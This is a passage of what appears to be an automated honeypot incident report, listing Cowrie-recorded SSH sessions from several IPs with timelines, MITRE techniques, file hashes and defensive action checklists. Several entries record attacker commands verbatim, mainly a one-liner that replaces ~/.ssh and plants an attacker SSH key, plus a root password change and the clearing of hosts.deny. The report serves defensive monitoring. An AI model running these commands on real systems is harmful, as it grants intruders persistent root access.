| `2026-04-15 04:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16432123350a

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:33 |
| **Last Seen** | 2026-04-15 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:33:16` | `cowrie.session.connect` |
| `2026-04-15 04:33:16` | `cowrie.client.version` |
| `2026-04-15 04:33:16` | `cowrie.client.kex` |
| `2026-04-15 04:33:17` | `cowrie.login.success` |
| `2026-04-15 04:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5107bafbc2f8

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:34 |
| **Last Seen** | 2026-04-15 04:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:34:18` | `cowrie.session.connect` |
| `2026-04-15 04:34:18` | `cowrie.client.version` |
| `2026-04-15 04:34:18` | `cowrie.client.kex` |
| `2026-04-15 04:34:19` | `cowrie.login.success` |
| `2026-04-15 04:34:19` | `cowrie.session.params` |
| `2026-04-15 04:34:19` | `cowrie.command.input` |
| `2026-04-15 04:34:19` | `cowrie.command.failed` |
| `2026-04-15 04:34:19` | `cowrie.log.closed` |
| `2026-04-15 04:34:20` | `cowrie.session.params` |
| `2026-04-15 04:34:20` | `cowrie.command.input` |
| `2026-04-15 04:34:20` | `cowrie.session.file_download` |
| `2026-04-15 04:34:20` | `cowrie.log.closed` |
| `2026-04-15 04:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d8e57691c9

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:34 |
| **Last Seen** | 2026-04-15 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:34:22` | `cowrie.session.connect` |
| `2026-04-15 04:34:22` | `cowrie.client.version` |
| `2026-04-15 04:34:23` | `cowrie.client.kex` |
| `2026-04-15 04:34:23` | `cowrie.login.success` |
| `2026-04-15 04:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e67a1fa6b05

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:37 |
| **Last Seen** | 2026-04-15 04:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:37:40` | `cowrie.session.connect` |
| `2026-04-15 04:37:40` | `cowrie.client.version` |
| `2026-04-15 04:37:40` | `cowrie.client.kex` |
| `2026-04-15 04:37:41` | `cowrie.login.success` |
| `2026-04-15 04:37:41` | `cowrie.session.params` |
| `2026-04-15 04:37:41` | `cowrie.command.input` |
| `2026-04-15 04:37:41` | `cowrie.command.failed` |
| `2026-04-15 04:37:41` | `cowrie.log.closed` |
| `2026-04-15 04:37:42` | `cowrie.session.params` |
| `2026-04-15 04:37:42` | `cowrie.command.input` |
| `2026-04-15 04:37:42` | `cowrie.session.file_download` |
| `2026-04-15 04:37:42` | `cowrie.log.closed` |
| `2026-04-15 04:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6cf4fdf24c6

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:37 |
| **Last Seen** | 2026-04-15 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:37:44` | `cowrie.session.connect` |
| `2026-04-15 04:37:44` | `cowrie.client.version` |
| `2026-04-15 04:37:44` | `cowrie.client.kex` |
| `2026-04-15 04:37:45` | `cowrie.login.success` |
| `2026-04-15 04:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af6458024b2

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:38 |
| **Last Seen** | 2026-04-15 04:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:38:44` | `cowrie.session.connect` |
| `2026-04-15 04:38:44` | `cowrie.client.version` |
| `2026-04-15 04:38:44` | `cowrie.client.kex` |
| `2026-04-15 04:38:45` | `cowrie.login.success` |
| `2026-04-15 04:38:45` | `cowrie.session.params` |
| `2026-04-15 04:38:45` | `cowrie.command.input` |
| `2026-04-15 04:38:45` | `cowrie.command.failed` |
| `2026-04-15 04:38:45` | `cowrie.log.closed` |
| `2026-04-15 04:38:46` | `cowrie.session.params` |
| `2026-04-15 04:38:46` | `cowrie.command.input` |
| `2026-04-15 04:38:46` | `cowrie.session.file_download` |
| `2026-04-15 04:38:46` | `cowrie.log.closed` |
| `2026-04-15 04:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39901677da25

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-04-15 04:38 |
| **Last Seen** | 2026-04-15 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:38:48` | `cowrie.session.connect` |
| `2026-04-15 04:38:48` | `cowrie.client.version` |
| `2026-04-15 04:38:48` | `cowrie.client.kex` |
| `2026-04-15 04:38:49` | `cowrie.login.success` |
| `2026-04-15 04:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab7fb6252fc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]205` |
| **First Seen** | 2026-04-15 05:04 |
| **Last Seen** | 2026-04-15 05:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:04:40` | `cowrie.session.connect` |
| `2026-04-15 05:04:40` | `cowrie.client.version` |
| `2026-04-15 05:04:41` | `cowrie.client.kex` |
| `2026-04-15 05:04:41` | `cowrie.login.success` |
| `2026-04-15 05:04:42` | `cowrie.session.params` |
| `2026-04-15 05:04:42` | `cowrie.command.input` |
| `2026-04-15 05:04:42` | `cowrie.command.failed` |
| `2026-04-15 05:04:42` | `cowrie.log.closed` |
| `2026-04-15 05:04:43` | `cowrie.session.params` |
| `2026-04-15 05:04:43` | `cowrie.command.input` |
| `2026-04-15 05:04:43` | `cowrie.session.file_download` |
| `2026-04-15 05:04:43` | `cowrie.log.closed` |
| `2026-04-15 05:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]205` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cd6328b9f98

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]205` |
| **First Seen** | 2026-04-15 05:04 |
| **Last Seen** | 2026-04-15 05:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:04:46` | `cowrie.session.connect` |
| `2026-04-15 05:04:46` | `cowrie.client.version` |
| `2026-04-15 05:04:46` | `cowrie.client.kex` |
| `2026-04-15 05:04:47` | `cowrie.login.success` |
| `2026-04-15 05:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]205` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6340d9d27c76

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]205` |
| **First Seen** | 2026-04-15 05:11 |
| **Last Seen** | 2026-04-15 05:12 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Dvc92RFiS5uS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:11:58` | `cowrie.session.connect` |
| `2026-04-15 05:11:58` | `cowrie.client.version` |
| `2026-04-15 05:11:58` | `cowrie.client.kex` |
| `2026-04-15 05:11:59` | `cowrie.login.success` |
| `2026-04-15 05:11:59` | `cowrie.session.params` |
| `2026-04-15 05:11:59` | `cowrie.command.input` |
| `2026-04-15 05:11:59` | `cowrie.command.failed` |
| `2026-04-15 05:11:59` | `cowrie.log.closed` |
| `2026-04-15 05:12:00` | `cowrie.session.params` |
| `2026-04-15 05:12:00` | `cowrie.command.input` |
| `2026-04-15 05:12:00` | `cowrie.session.file_download` |
| `2026-04-15 05:12:00` | `cowrie.log.closed` |
| `2026-04-15 05:12:10` | `cowrie.session.params` |
| `2026-04-15 05:12:10` | `cowrie.command.input` |
| `2026-04-15 05:12:10` | `cowrie.log.closed` |
| `2026-04-15 05:12:10` | `cowrie.session.params` |
| `2026-04-15 05:12:10` | `cowrie.command.input` |
| `2026-04-15 05:12:11` | `cowrie.log.closed` |
| `2026-04-15 05:12:12` | `cowrie.session.params` |
| `2026-04-15 05:12:12` | `cowrie.command.input` |
| `2026-04-15 05:12:13` | `cowrie.session.file_download` |
| `2026-04-15 05:12:13` | `cowrie.log.closed` |
| `2026-04-15 05:12:13` | `cowrie.session.params` |
| `2026-04-15 05:12:13` | `cowrie.command.input` |
| `2026-04-15 05:12:13` | `cowrie.log.closed` |
| `2026-04-15 05:12:14` | `cowrie.session.params` |
| `2026-04-15 05:12:14` | `cowrie.command.input` |
| `2026-04-15 05:12:14` | `cowrie.log.closed` |
| `2026-04-15 05:12:14` | `cowrie.session.params` |
| `2026-04-15 05:12:14` | `cowrie.command.input` |
| `2026-04-15 05:12:14` | `cowrie.command.input` |
| `2026-04-15 05:12:15` | `cowrie.log.closed` |
| `2026-04-15 05:12:16` | `cowrie.session.params` |
| `2026-04-15 05:12:16` | `cowrie.command.input` |
| `2026-04-15 05:12:16` | `cowrie.log.closed` |
| `2026-04-15 05:12:16` | `cowrie.session.params` |
| `2026-04-15 05:12:16` | `cowrie.command.input` |
| `2026-04-15 05:12:17` | `cowrie.log.closed` |
| `2026-04-15 05:12:17` | `cowrie.session.params` |
| `2026-04-15 05:12:17` | `cowrie.command.input` |
| `2026-04-15 05:12:17` | `cowrie.log.closed` |
| `2026-04-15 05:12:18` | `cowrie.session.params` |
| `2026-04-15 05:12:18` | `cowrie.command.input` |
| `2026-04-15 05:12:18` | `cowrie.log.closed` |
| `2026-04-15 05:12:18` | `cowrie.session.params` |
| `2026-04-15 05:12:18` | `cowrie.command.input` |
| `2026-04-15 05:12:19` | `cowrie.log.closed` |
| `2026-04-15 05:12:20` | `cowrie.session.params` |
| `2026-04-15 05:12:20` | `cowrie.command.input` |
| `2026-04-15 05:12:20` | `cowrie.log.closed` |
| `2026-04-15 05:12:23` | `cowrie.session.params` |
| `2026-04-15 05:12:23` | `cowrie.command.input` |
| `2026-04-15 05:12:23` | `cowrie.log.closed` |
| `2026-04-15 05:12:24` | `cowrie.session.params` |
| `2026-04-15 05:12:24` | `cowrie.command.input` |
| `2026-04-15 05:12:24` | `cowrie.log.closed` |
| `2026-04-15 05:12:24` | `cowrie.session.params` |
| `2026-04-15 05:12:24` | `cowrie.command.input` |
| `2026-04-15 05:12:24` | `cowrie.log.closed` |
| `2026-04-15 05:12:25` | `cowrie.session.params` |
| `2026-04-15 05:12:25` | `cowrie.command.input` |
| `2026-04-15 05:12:25` | `cowrie.log.closed` |
| `2026-04-15 05:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]205` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd54db0aae3a

| Field | Detail |
|---|---|
| **Source IP** | `164.90.138[.]136` |
| **First Seen** | 2026-04-15 05:22 |
| **Last Seen** | 2026-04-15 05:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:22:46` | `cowrie.session.connect` |
| `2026-04-15 05:22:46` | `cowrie.client.version` |
| `2026-04-15 05:22:46` | `cowrie.client.kex` |
| `2026-04-15 05:22:47` | `cowrie.login.success` |
| `2026-04-15 05:22:47` | `cowrie.session.params` |
| `2026-04-15 05:22:47` | `cowrie.command.input` |
| `2026-04-15 05:22:47` | `cowrie.command.failed` |
| `2026-04-15 05:22:47` | `cowrie.log.closed` |
| `2026-04-15 05:22:48` | `cowrie.session.params` |
| `2026-04-15 05:22:48` | `cowrie.command.input` |
| `2026-04-15 05:22:48` | `cowrie.session.file_download` |
| `2026-04-15 05:22:48` | `cowrie.log.closed` |
| `2026-04-15 05:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.90.138[.]136` to AbuseIPDB if not already reported
- [ ] Block `164.90.138[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a6224bcca39

| Field | Detail |
|---|---|
| **Source IP** | `164.90.138[.]136` |
| **First Seen** | 2026-04-15 05:22 |
| **Last Seen** | 2026-04-15 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:22:51` | `cowrie.session.connect` |
| `2026-04-15 05:22:51` | `cowrie.client.version` |
| `2026-04-15 05:22:51` | `cowrie.client.kex` |
| `2026-04-15 05:22:52` | `cowrie.login.success` |
| `2026-04-15 05:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.90.138[.]136` to AbuseIPDB if not already reported
- [ ] Block `164.90.138[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca707e5133f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]233` |
| **First Seen** | 2026-04-15 05:25 |
| **Last Seen** | 2026-04-15 05:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:25:30` | `cowrie.session.connect` |
| `2026-04-15 05:25:30` | `cowrie.client.version` |
| `2026-04-15 05:25:30` | `cowrie.client.kex` |
| `2026-04-15 05:25:31` | `cowrie.login.success` |
| `2026-04-15 05:25:31` | `cowrie.session.params` |
| `2026-04-15 05:25:31` | `cowrie.command.input` |
| `2026-04-15 05:25:31` | `cowrie.command.failed` |
| `2026-04-15 05:25:31` | `cowrie.log.closed` |
| `2026-04-15 05:25:31` | `cowrie.session.params` |
| `2026-04-15 05:25:31` | `cowrie.command.input` |
| `2026-04-15 05:25:31` | `cowrie.session.file_download` |
| `2026-04-15 05:25:31` | `cowrie.log.closed` |
| `2026-04-15 05:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b080612acefd

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]233` |
| **First Seen** | 2026-04-15 05:25 |
| **Last Seen** | 2026-04-15 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:25:36` | `cowrie.session.connect` |
| `2026-04-15 05:25:36` | `cowrie.client.version` |
| `2026-04-15 05:25:36` | `cowrie.client.kex` |
| `2026-04-15 05:25:37` | `cowrie.login.success` |
| `2026-04-15 05:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b0ef11ddc19

| Field | Detail |
|---|---|
| **Source IP** | `187.51.208[.]158` |
| **First Seen** | 2026-04-15 05:26 |
| **Last Seen** | 2026-04-15 05:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
